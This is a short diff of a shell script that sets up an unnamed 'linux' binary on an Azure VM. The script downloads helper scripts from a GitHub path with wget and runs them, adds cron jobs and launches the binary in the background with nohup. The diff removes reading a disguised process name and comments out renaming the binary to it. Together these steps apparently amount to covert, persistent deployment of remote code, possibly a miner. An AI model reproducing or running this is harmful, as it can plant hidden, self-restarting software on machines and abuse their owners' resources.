@@ -26,7 +26,7 @@ cd /home/azureuser
 	mkdir bin
 	cp linux bin/linux
 	cp inuser.txt bin/inuser.txt
-	cluser=$(head -1 inuser.txt)
+	
 	wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
 	wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
 	wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
@@ -36,12 +36,10 @@ cd /home/azureuser
 		./cronadd.sh
 		./processname.sh
 	cd bin/
-		
-		USEPROCNAME=$(cat SETPROCNAME.txt)
 		wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
 		mv runlinux.sh runsrc.sh
 		chmod +x runsrc.sh
-		mv linux $USEPROCNAME
+		#mv linux $USEPROCNAME
 		sudo chown -R azureuser:users /home/azureuser/
 		nohup sh runsrc.sh > result.log 2>&1 &
 			
